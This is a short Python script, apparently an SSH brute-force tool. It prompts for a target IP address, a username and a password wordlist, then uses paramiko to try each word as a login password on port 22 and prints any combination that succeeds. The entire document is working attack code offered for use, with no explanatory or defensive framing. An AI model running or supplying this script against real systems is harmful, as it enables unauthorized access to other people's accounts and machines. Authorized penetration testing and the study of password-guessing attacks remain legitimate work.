#!/usr/bin/env python

import socket, os, sys, paramiko

global host, user, file, line

try:
    host=input("\nPlease Enter Target IP Address: ")
    username=input("\nPlease Enter the Username: ")
    file=input("\nPlease Enter filename with full path: ")
    if os.path.exists(file) == False:
        print("\nFile Doesnt Exist")
        sys.exit()
except KeyboardInterrupt:
    print("\nUser Stopped The Script")
    sys.exit()

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host,port=22, username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code

file = open(file)

for word in file.readlines():
    password= word.strip("\n")
    try:
        response = ssh_connect(password)
        if response == 0:
            print ("\nUser: %s   Password:  %s" %(username,password))
        elif response == 2:
            print ("\nNetwork Error")
            sys.exit()
    except Exception:
        print(Exception)
        pass

file.close()
